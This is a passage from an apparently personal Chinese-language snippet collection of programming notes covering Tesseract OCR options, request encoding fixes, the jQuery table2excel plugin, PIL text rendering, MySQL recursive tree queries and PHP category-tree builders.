    -l eng：使用英文识别库；
    -psm 7：表示分页方式，7表示将图片视为单行文字；
    digits：识别配置文件，这里表示只识别数字。

查看目前支持那些语言：

tesseract --list-langs # chi_sim chi_tra eng osd
from pyocr import tesseract

builder = tesseract.builders.TextBuilder()
builder.tesseract_configs = ['-psm', '7', 'scbid'] 
result = tesseract.image_to_string(Image.open('ocr_test.png'), 'eng', builder)
```
###[request乱码](https://segmentfault.com/q/1010000008173276)
```js
import requests
word = input('>')
payload = {'keyword':word}
r = requests.get('http://search.bilibili.com/all', params=payload)
print(r.text.encode('utf-8'))
r = requests.get(url, proxies=proxies)
r.encoding = r.apparent_encoding
print r.text
```
###[jQuery 导出table表格](http://www.jqueryscript.net/table/Export-Html-Table-To-Excel-Spreadsheet-using-jQuery-table2excel.html)
```js
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
//table2excel.js
;(function ( $, window, document, undefined ) {
		var pluginName = "table2excel",
				defaults = {
				exclude: ".noExl",
                name: "Table2Excel"
		};

		// The actual plugin constructor
		function Plugin ( element, options ) {
				this.element = element;
				// jQuery has an extend method which merges the contents of two or
				// more objects, storing the result in the first object. The first object
				// is generally empty as we don't want to alter the default options for
				// future instances of the plugin
				this.settings = $.extend( {}, defaults, options );
				this._defaults = defaults;
				this._name = pluginName;
				this.init();
		}

		Plugin.prototype = {
			init: function () {
				var e = this;
				e.template = "<html xmlns:o=\"urn:schemas-microsoft-com:office:office\" xmlns:x=\"urn:schemas-microsoft-com:office:excel\" xmlns=\"http://www.w3.org/TR/REC-html40\"><head><!--[if gte mso 9]><xml>";
				e.template += "<x:ExcelWorkbook><x:ExcelWorksheets><x:ExcelWorksheet><x:Name>{worksheet}</x:Name><x:WorksheetOptions>";
				e.template += "<x:DisplayGridlines/></x:WorksheetOptions></x:ExcelWorksheet></x:ExcelWorksheets></x:ExcelWorkbook></xml><![endif]--></head><body><table>{table}</table></body></html>";
				e.tableRows = "";

				// get contents of table except for exclude
				$(e.element).find("tr").not(this.settings.exclude).each(function (i,o) {
					e.tableRows += "<tr>" + $(o).html() + "</tr>";
				});
				this.tableToExcel(this.tableRows, this.settings.name);
			},
			tableToExcel: function (table, name) {
				var e = this;
				e.uri = "data:application/vnd.ms-excel;base64,";
				e.base64 = function (s) {
					return window.btoa(unescape(encodeURIComponent(s)));
				};
				e.format = function (s, c) {
					return s.replace(/{(\w+)}/g, function (m, p) {
						return c[p];
					});
				};
				e.ctx = {
					worksheet: name || "Worksheet",
					table: table
				};
				window.location.href = e.uri + e.base64(e.format(e.template, e.ctx));
			}
		};

		$.fn[ pluginName ] = function ( options ) {
				this.each(function() {
						if ( !$.data( this, "plugin_" + pluginName ) ) {
								$.data( this, "plugin_" + pluginName, new Plugin( this, options ) );
						}
				});

				// chain jQuery functions
				return this;
		};

})( jQuery, window, document );
<script src="http://www.jqueryscript.net/demo/Export-Html-Table-To-Excel-Spreadsheet-using-jQuery-table2excel/src/jquery.table2excel.js"></script>
<button>Export</button>
<tr class="noExl">
  <th>#</th>
  <th>Column heading</th>
  <th>Column heading</th>
  <th>Column heading</th>
</tr>
$("button").click(function(){
  $("#table2excel").table2excel({
    // exclude CSS class
    exclude: ".noExl",
    name: "Worksheet Name",
    filename: "SomeFile" //do not include extension
  }); 
});

```
###[Python将文本转为图片](https://blog.oldj.net/2012/02/19/text-to-image/)
```js
import os
import Image, ImageFont, ImageDraw
 
text = u"这是一段测试文本，test 123。"
 
im = Image.new("RGB", (300, 50), (255, 255, 255))
dr = ImageDraw.Draw(im)
font = ImageFont.truetype(os.path.join("fonts", "msyh.ttf"), 14)
 font = ImageFont.truetype(os.path.join("fonts", "simsun.ttc"), 18)
dr.text((10, 5), text, font=font, fill="#000000")
 
im.show()
im.save("t.png")
PIL 1.1.7有问题 换成PIL 1.1.6试试
ImportError: The _imagingft C module is not installed 
```
###[mysql递归查询，mysql中从子类ID查询所有父类](http://blog.csdn.net/qiaqia609/article/details/52119535)
```js
id  name    parent_id 
--------------------------- 
1   Home        0 
2   About       1 
3   Contact     1 
4   Legal       2 
5   Privacy     4 
6   Products    1 
7   Support     1 
SELECT T2.id, T2.name 
FROM ( 
    SELECT 
        @r AS _id, 
        (SELECT @r := parent_id FROM table1 WHERE id = _id) AS parent_id, 
        @l := @l + 1 AS lvl 
    FROM 
        (SELECT @r := 5, @l := 0) vars, 
        table1 h 
    WHERE @r <> 0) T1 
JOIN table1 T2 
ON T1._id = T2.id 
ORDER BY T1.lvl DESC 




代码@r := 5标示查询id为5的所有父类。结果如下
1, ‘Home’
2, ‘About’
4, ‘Legal’
5, ‘Privacy’

id pid level name path
1 0 1 编程语言 0-1
2 1 2 PHP 0-1-2
3 1 2 JAVA 0-1-3
4 2 3 PHP移动开发 0-1-2-4
5 3 3 JAVAEE 0-1-3-5
6 0 1 JS框架 0-6
http://www.dewen.net.cn/q/10238/PHP+Mysql%E6%97%A0%E9%99%90%E7%BA%A7%E5%88%86%E7%B1%BB%E9%AB%98%E6%95%88%E6%9F%A5%E8%AF%A2
path的是由父ID-自身ID这种格式组成，查询按照path字段排序即可。
select * from table order by path asc;
SELECT id,path FROM sh_privilege ORDER BY CONCAT(path,‘-‘,id);
 8 的子权限：SELECT id,path FROM sh_privilege WHERE CONCAT(‘-‘,path,‘-‘) LIKE ‘%-8-%’;
这样查询分类变得简单了，修改分类的时候也需要更新path字段。
```
###[一句SQL实现MYSQL的递归查询](http://www.cnblogs.com/dukou/p/4691543.html)
```js
CREATE TABLE `treenodes` (
    `id` int , -- 节点ID
    `nodename` varchar (60), -- 节点名称
    `pid` int  -- 节点父ID
); 
INSERT INTO `treenodes` (`id`, `nodename`, `pid`) VALUES
('1','A','0'),('2','B','1'),('3','C','1'),
('4','D','2'),('5','E','2'),('6','F','3'),
('7','G','6'),('8','H','0'),('9','I','8'),
('10','J','8'),('11','K','8'),('12','L','9'),
('13','M','9'),('14','N','12'),('15','O','12'),
('16','P','15'),('17','Q','15'),('18','R','3'),
('19','S','2'),('20','T','6'),('21','U','8');
 SELECT id AS ID,pid AS 父ID ,levels AS 父到子之间级数, paths AS 父到子路径 FROM (
     SELECT id,pid,
     @le:= IF (pid = 0 ,0,  
         IF( LOCATE( CONCAT('|',pid,':'),@pathlevel)   > 0  ,      
                  SUBSTRING_INDEX( SUBSTRING_INDEX(@pathlevel,CONCAT('|',pid,':'),-1),'|',1) +1
        ,@le+1) ) levels
     , @pathlevel:= CONCAT(@pathlevel,'|',id,':', @le ,'|') pathlevel
      , @pathnodes:= IF( pid =0,',0', 
           CONCAT_WS(',',
           IF( LOCATE( CONCAT('|',pid,':'),@pathall) > 0  , 
               SUBSTRING_INDEX( SUBSTRING_INDEX(@pathall,CONCAT('|',pid,':'),-1),'|',1)
              ,@pathnodes ) ,pid  ) )paths
    ,@pathall:=CONCAT(@pathall,'|',id,':', @pathnodes ,'|') pathall 
        FROM  treenodes, 
    (SELECT @le:=0,@pathlevel:='', @pathall:='',@pathnodes:='') vv
    ORDER BY  pid,id
    ) src
ORDER BY id
 ID   父ID  父到子之间级数  父到子路径
------  ------  ------------  ---------------
     1       0        0           ,0             
     2       1        1           ,0,1           
     3       1        1           ,0,1           
     4       2        2           ,0,1,2         
     5       2        2           ,0,1,2         
     6       3        2           ,0,1,3         
     7       6        3           ,0,1,3,6       
     8       0        0           ,0             
     9       8        1           ,0,8           
    10       8        1           ,0,8           
    11       8        1           ,0,8           
    12       9        2           ,0,8,9         
    13       9        2           ,0,8,9         
    14      12        3           ,0,8,9,12      
    15      12        3           ,0,8,9,12      
    16      15        4           ,0,8,9,12,15   
    17      15        4           ,0,8,9,12,15   
    18       3        2           ,0,1,3         
    19       2        2           ,0,1,2         
    20       6        3           ,0,1,3,6       
    21       8        1           ,0,8       

 CREATE FUNCTION `getParentList`(rootId varchar(100))   
RETURNS varchar(1000)   
BEGIN   
DECLARE fid varchar(100) default '';   
DECLARE str varchar(1000) default rootId;   
  
WHILE rootId is not null  do   
    SET fid =(SELECT parentid FROM treeNodes WHERE id = rootId);   
    IF fid is not null THEN   
        SET str = concat(str, ',', fid);   
        SET rootId = fid;   
    ELSE   
        SET rootId = fid;   
    END IF;   
END WHILE;   
return str;  
END  
//http://happyqing.iteye.com/blog/2166841
select getParentList('001001001001001');   
  
select * from sbkfwh where FIND_IN_SET(id,getParentList('001001001001002'))   
```
###[MySQL递归查询](https://my.oschina.net/freekeeper/blog/647078)
```js
CREATE TABLE `area` (
    `area_id` INT(11) NOT NULL AUTO_INCREMENT,
    `parent_id` INT(11) NULL DEFAULT NULL,
    `name` VARCHAR(60) NULL DEFAULT NULL,
    `level` TINYINT(4) NULL DEFAULT NULL,
    `aleph` VARCHAR(5) NULL DEFAULT NULL,
    `show_order` INT(11) NULL DEFAULT NULL,
    `status` TINYINT(4) NULL DEFAULT NULL,
    PRIMARY KEY (`area_id`)
)
COLLATE='utf8_general_ci'
ENGINE=MyISAM;
CREATE DEFINER=`root`@`127.0.0.1` FUNCTION `queryChildAreaIds`(`areaId` INT, `deep` INT)
    RETURNS varchar(1024) CHARSET utf8
    LANGUAGE SQL
    NOT DETERMINISTIC
    CONTAINS SQL
    SQL SECURITY DEFINER
    COMMENT '查询指定区域的所有下级的地区ID集'
BEGIN
DECLARE tempIds VARCHAR(512);
DECLARE result VARCHAR(1024);
DECLARE deeps INT;

SET tempIds = areaId;
SET result = '';
SET deeps = deep;

WHILE deeps > 0 AND tempIds IS NOT NULL DO
    SET deeps = deeps - 1;
    SELECT group_concat(area_id) INTO tempIds from AREA where 
    FIND_IN_SET(parent_id, tempIds) > 0;
    IF tempIds IS NOT NULL THEN 
        IF LENGTH(result) = 0 THEN
            SET result = CONCAT(result, tempIds);
        ELSE 
            SET result = CONCAT(result, ',', tempIds);
        END IF;
    END IF;
END WHILE;
return result;
END

CREATE DEFINER=`root`@`127.0.0.1` FUNCTION `queryParentAreaIds`(`areaId` INT, `deep` INT)
    RETURNS varchar(256) CHARSET utf8
    LANGUAGE SQL
    NOT DETERMINISTIC
    CONTAINS SQL
    SQL SECURITY DEFINER
    COMMENT '查询指定区域的所有上级的地区ID集合'
BEGIN
DECLARE tempId INT;
DECLARE lastId INT;
DECLARE deeps INT;
DECLARE result VARCHAR(256);

SET tempId = areaId;
SET result = '';
SET deeps = deep;

WHILE deeps > 0 AND tempId > 0 DO
    SET deeps = deeps - 1;
    SET lastId = areaId;
    SELECT parent_id INTO tempId FROM AREA where area_id=tempId and `status`=1 limit 1;
    IF tempId IS NULL OR lastId = tempId THEN 
        SET areaId = 0;
    ELSEIF LENGTH(result) = 0 THEN
        SET result = CONCAT(result, tempId);
    ELSE 
        SET result = CONCAT(result, ',', tempId);
    END IF;
END WHILE;
return result;
END
```
###[mysql如何解决评论递归查询](https://www.zhihu.com/question/26899921)
```js
表数据字段有:spirit_id,content,create_user,ip,create_time,art_id,delete_flag,parent_id
如果不止两层的树形结构也是可以查询的
SELECT 
    a.*, b.parent_id
FROM
    the_table a
        INNER JOIN
    the_table b ON a.parent_id = b.spirit_id
WHERE
    a.art_id = 'article158767679'
这样你就把article158767679文章下面的所有树都查出来了，会显得很乱，如果你要查某一棵树，可以增加一个字段摆放树根root，这棵树的所有节点都必须要有这棵树的根信息，这样只需要把最后一个where改成a.root='some_id'就可以具体确定某一棵树了。

 增加一个字段full_parent_id,存储方式为/XXX/XXX/；层级以此类推，查询方法，select *from table where full_parent_id like %/parent_id/% order by createtime，大概就是这个意思了

我们在设计的时候都是用父ID的这种比较传统的实现方法来的
不过区别是：所有回复不会互相嵌套，回复的父ID都是评论的ID，也就是说只存在两级，所有的回复之前除了“回复xxx” 能看出来关系外，是没有直接关系的。只不过所有回复按时间升序排列，所以看起来它们之间有关系。当时这样设计的原因是这样设计还可以同时满足“我可以删除回复对话的任意一条而不影响其它回复”。
A 评论了内容：内容不错 (id: 1， parent_id: 0)
   B 回复 A： 我也觉得 (id:2, parent:1)
   C 回复 B： 真的不错 (id:3, parent:1)
   B 回复 A： @A 看来是真的好啊哈哈。 (id:4, parent:1)

 
```
###[MySQL节点无限分类表](https://github.com/vergil-lai/mysql-node-categoires)
```js
地区表，在基本的parent_id上，加入node_index字段，保存每级节点id

id	parent_id	level	name	node_index
19	0	1	广东省	,0,19,
289	19	2	广州市	,0,19,289,
291	19	2	深圳市	,0,19,291,
3040	289	3	天河区	,0,19,289,3040,
3041	289	3	海珠区	,0,19,289,3041,
29014	3040	4	员村街道	,0,19,289,3040,29014,
那么，如果需要搜索parent_id为289的“广州市”下所有子地区分类，可以使用以下SQL：

SELECT * FROM `category_has_node` WHERE `node_index` LIKE ',0,19,289,%';
```
###[PHP递归实现无限级分类](http://www.helloweba.com/view-blog-204.html)
```js
function get_str($id = 0) { 
    global $str; 
    $sql = "select id,title from class where pid= $id";  
    $result = mysql_query($sql);//查询pid的子类的分类 
    if($result && mysql_affected_rows()){//如果有子类 
        $str .= '<ul>'; 
        while ($row = mysql_fetch_array($result)) { //循环记录集 
            $str .= "<li>" . $row['id'] . "--" . $row['title'] . "</li>"; //构建字符串 
            get_str($row['id']); //调用get_str()，将记录集中的id参数传入函数中，继续查询下级 
        } 
        $str .= '</ul>'; 
    } 
    return $str; 
} 

/**
 * 此方法由@Tonton 提供
 * http://my.oschina.net/u/918697
 * @date 2012-12-12 
 */
function genTree5($items) { 
    foreach ($items as $item) 
        $items[$item['pid']]['son'][$item['id']] = &$items[$item['id']]; 
    return isset($items[0]['son']) ? $items[0]['son'] : array(); 
} 
 
/**
 * 将数据格式化成树形结构
 * @author Xuefen.Tong
 * @param array $items
 * @return array 
 */
function genTree9($items) {
    $tree = array(); //格式化好的树
    foreach ($items as $item)
        if (isset($items[$item['pid']]))
            $items[$item['pid']]['son'][] = &$items[$item['id']];
        else
            $tree[] = &$items[$item['id']];
    return $tree;
}
 
$items = array(
    1 => array('id' => 1, 'pid' => 0, 'name' => '江西省'),
    2 => array('id' => 2, 'pid' => 0, 'name' => '黑龙江省'),
    3 => array('id' => 3, 'pid' => 1, 'name' => '南昌市'),
    4 => array('id' => 4, 'pid' => 2, 'name' => '哈尔滨市'),
    5 => array('id' => 5, 'pid' => 2, 'name' => '鸡西市'),
    6 => array('id' => 6, 'pid' => 4, 'name' => '香坊区'),
    7 => array('id' => 7, 'pid' => 4, 'name' => '南岗区'),
    8 => array('id' => 8, 'pid' => 6, 'name' => '和兴路'),
    9 => array('id' => 9, 'pid' => 7, 'name' => '西大直街'),
    10 => array('id' => 10, 'pid' => 8, 'name' => '东北林业大学'),
    11 => array('id' => 11, 'pid' => 9, 'name' => '哈尔滨工业大学'),
    12 => array('id' => 12, 'pid' => 8, 'name' => '哈尔滨师范大学'),
    13 => array('id' => 13, 'pid' => 1, 'name' => '赣州市'),
    14 => array('id' => 14, 'pid' => 13, 'name' => '赣县'),
    15 => array('id' => 15, 'pid' => 13, 'name' => '于都县'),
    16 => array('id' => 16, 'pid' => 14, 'name' => '茅店镇'),
    17 => array('id' => 17, 'pid' => 14, 'name' => '大田乡'),
    18 => array('id' => 18, 'pid' => 16, 'name' => '义源村'),
    19 => array('id' => 19, 'pid' => 16, 'name' => '上坝村'),
);
echo "<pre>";
print_r(genTree5($items));
print_r(genTree9($items));
 
//后者输出格式，前者类似，只是数组键值不一样，不过不影响数据结构
/*http://www.oschina.net/code/snippet_173183_11767 
Array
(
[0] => Array
    (
        [id] => 1
        [pid] => 0
        [name] => 江西省
        [son] => Array
            (
                [0] => Array
                    (
                        [id] => 3
                        [pid] => 1
                        [name] => 南昌市
                    )
 
                [1] => Array
                    (
                        [id] => 13
                        [pid] => 1
                        [name] => 赣州市
                        [son] => Array
                            (
                                [0] => Array
                                    (
                                        [id] => 14
                                        [pid] => 13
                                        [name] => 赣县
                                        [son] => Array
                                            (
                                            [0] => Array
                                                (
                                                    [id] => 16
                                                    [pid] => 14
                                                    [name] => 茅店镇
                                                    [son] => Array
                                                        (
                                                        [0] => Array
                                                            (
                                                            [id] => 18
                                                            [pid] => 16
                                                            [name] => 义源村
                                                            )
 
                                                        [1] => Array
                                                            (
                                                            [id] => 19
                                                            [pid] => 16
                                                            [name] => 上坝村
                                                            )
 
                                                        )
 
                                                )
 
                                            [1] => Array
                                                (
                                                    [id] => 17
                                                    [pid] => 14
                                                    [name] => 大田乡
                                                )
 
                                            )
 
                                    )
 
                                [1] => Array
                                    (
                                        [id] => 15
                                        [pid] => 13
                                        [name] => 于都县
                                    )
 
                            )
 
                    )
 
            )
 
    )
 
[1] => Array
    (
        [id] => 2
        [pid] => 0
        [name] => 黑龙江省
        [son] => Array
            (
                [0] => Array
                    (
                        [id] => 4
                        [pid] => 2
                        [name] => 哈尔滨市
                        [son] => Array
                            (
                            [0] => Array
                                (
                                    [id] => 6
                                    [pid] => 4
                                    [name] => 香坊区
                                    [son] => Array
                                        (
                                        [0] => Array
                                            (
                                                [id] => 8
                                                [pid] => 6
                                                [name] => 和兴路
                                                [son] => Array
                                                    (
                                                        [0] => Array
                                                            (
                                                            [id] => 10
                                                            [pid] => 8
                                                            [name] => 
                                                             东北林业大学
                                                            )
 
                                                        [1] => Array
                                                            (
                                                            [id] => 12
                                                            [pid] => 8
                                                            [name] => 
                                                            哈尔滨师范大学
                                                            )
 
                                                    )
 
                                            )
 
                                        )
 
                                )
				
LinkageSel：javascript无限级联动下拉菜单 省市地多级联动多属性值下拉菜单 附带中国行政区划数据 http://www.oschina.net/code/snippet_126398_5391 				
				
```
